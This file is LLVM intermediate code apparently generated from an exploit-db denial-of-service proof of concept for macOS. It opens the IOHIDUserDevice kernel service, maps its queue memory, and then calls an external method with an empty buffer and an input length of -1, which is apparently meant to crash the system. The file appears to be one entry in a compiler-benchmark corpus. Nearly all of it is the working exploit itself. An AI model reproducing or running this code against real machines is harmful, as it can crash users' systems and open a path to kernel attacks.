; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_45651.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_45651.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [9 x i8] c"pid: %d\0A\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [16 x i8] c"IOHIDUserDevice\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"got client\0A\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"IOConnectCall error: %x\0A\00", align 1
@.str.6 = private unnamed_addr constant [29 x i8] c"called external method open\0A\00", align 1
@.str.7 = private unnamed_addr constant [32 x i8] c"IOConnectMapMemory failed:0x%x\0A\00", align 1
@.str.8 = private unnamed_addr constant [35 x i8] c"mapped queue memory here: %016llx\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca [16 x i32], align 16
  %10 = alloca i32, align 4
  %11 = alloca [4096 x i8], align 16
  %12 = alloca i64, align 8
  %13 = alloca [16 x i32], align 16
  %14 = alloca i64, align 8
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i64, align 8
  %17 = alloca i64, align 8
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = call i32 (...) @getpid()
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str, i64 0, i64 0), i32 %20)
  %22 = load i32, i32* @kIOMasterPortDefault, align 4
  %23 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %24 = call i64 @IOServiceGetMatchingService(i32 %22, i32 %23)
  store i64 %24, i64* %7, align 8
  %25 = load i64, i64* %7, align 8
  %26 = load i64, i64* @IO_OBJECT_NULL, align 8
  %27 = icmp eq i64 %25, %26
  br i1 %27, label %28, label %30

28:                                               ; preds = %2
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %91

30:                                               ; preds = %2
  %31 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %31, i32* %8, align 4
  %32 = load i64, i64* %7, align 8
  %33 = call i32 (...) @mach_task_self()
  %34 = call i64 @IOServiceOpen(i64 %32, i32 %33, i32 0, i32* %8)
  store i64 %34, i64* %6, align 8
  %35 = load i64, i64* %6, align 8
  %36 = load i64, i64* @KERN_SUCCESS, align 8
  %37 = icmp ne i64 %35, %36
  br i1 %37, label %38, label %40

38:                                               ; preds = %30
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %91

40:                                               ; preds = %30
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %10, align 4
  store i64 0, i64* %12, align 8
  store i64 0, i64* %14, align 8
  store i64 0, i64* %16, align 8
  %42 = getelementptr inbounds [16 x i32], [16 x i32]* %9, i64 0, i64 0
  store i32 0, i32* %42, align 16
  store i32 1, i32* %10, align 4
  %43 = load i32, i32* %8, align 4
  %44 = getelementptr inbounds [16 x i32], [16 x i32]* %9, i64 0, i64 0
  %45 = load i32, i32* %10, align 4
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %47 = load i64, i64* %12, align 8
  %48 = trunc i64 %47 to i32
  %49 = getelementptr inbounds [16 x i32], [16 x i32]* %13, i64 0, i64 0
  %50 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %51 = call i64 @IOConnectCallMethod(i32 %43, i32 1, i32* %44, i32 %45, i8* %46, i32 %48, i32* %49, i64* %14, i8* %50, i64* %16)
  store i64 %51, i64* %6, align 8
  %52 = load i64, i64* %6, align 8
  %53 = load i64, i64* @KERN_SUCCESS, align 8
  %54 = icmp ne i64 %52, %53
  br i1 %54, label %55, label %58

55:                                               ; preds = %40
  %56 = load i64, i64* %6, align 8
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i64 %56)
  store i32 0, i32* %3, align 4
  br label %91

58:                                               ; preds = %40
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.6, i64 0, i64 0))
  store i64 279172874240, i64* %17, align 8
  store i32 4096, i32* %18, align 4
  %60 = load i32, i32* %8, align 4
  %61 = call i32 (...) @mach_task_self()
  %62 = call i64 @IOConnectMapMemory(i32 %60, i32 0, i32 %61, i64* %17, i32* %18, i32 0)
  store i64 %62, i64* %6, align 8
  %63 = load i64, i64* %6, align 8
  %64 = load i64, i64* @KERN_SUCCESS, align 8
  %65 = icmp ne i64 %63, %64
  br i1 %65, label %66, label %69

66:                                               ; preds = %58
  %67 = load i64, i64* %6, align 8
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.7, i64 0, i64 0), i64 %67)
  store i32 0, i32* %3, align 4
  br label %91

69:                                               ; preds = %58
  %70 = load i64, i64* %17, align 8
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.8, i64 0, i64 0), i64 %70)
  %72 = call i8* @malloc(i32 0)
  store i8* %72, i8** %19, align 8
  %73 = load i8*, i8** %19, align 8
  %74 = call i32 @memset(i8* %73, i8 signext 65, i32 0)
  %75 = getelementptr inbounds [16 x i32], [16 x i32]* %9, i64 0, i64 0
  store i32 0, i32* %75, align 16
  %76 = getelementptr inbounds [16 x i32], [16 x i32]* %9, i64 0, i64 1
  store i32 0, i32* %76, align 4
  store i32 3, i32* %10, align 4
  store i64 0, i64* %14, align 8
  %77 = load i32, i32* %8, align 4
  %78 = getelementptr inbounds [16 x i32], [16 x i32]* %9, i64 0, i64 0
  %79 = load i32, i32* %10, align 4
  %80 = load i8*, i8** %19, align 8
  %81 = getelementptr inbounds [16 x i32], [16 x i32]* %13, i64 0, i64 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %83 = call i64 @IOConnectCallMethod(i32 %77, i32 13, i32* %78, i32 %79, i8* %80, i32 -1, i32* %81, i64* %14, i8* %82, i64* %16)
  store i64 %83, i64* %6, align 8
  %84 = load i64, i64* %6, align 8
  %85 = load i64, i64* @KERN_SUCCESS, align 8
  %86 = icmp ne i64 %84, %85
  br i1 %86, label %87, label %90

87:                                               ; preds = %69
  %88 = load i64, i64* %6, align 8
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i64 %88)
  store i32 0, i32* %3, align 4
  br label %91

90:                                               ; preds = %69
  store i32 0, i32* %3, align 4
  br label %91

91:                                               ; preds = %90, %87, %66, %55, %38, %28
  %92 = load i32, i32* %3, align 4
  ret i32 %92
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i8*, i32, i32*, i64*, i8*, i64*) #1

declare dso_local i64 @IOConnectMapMemory(i32, i32, i32, i64*, i32*, i32) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
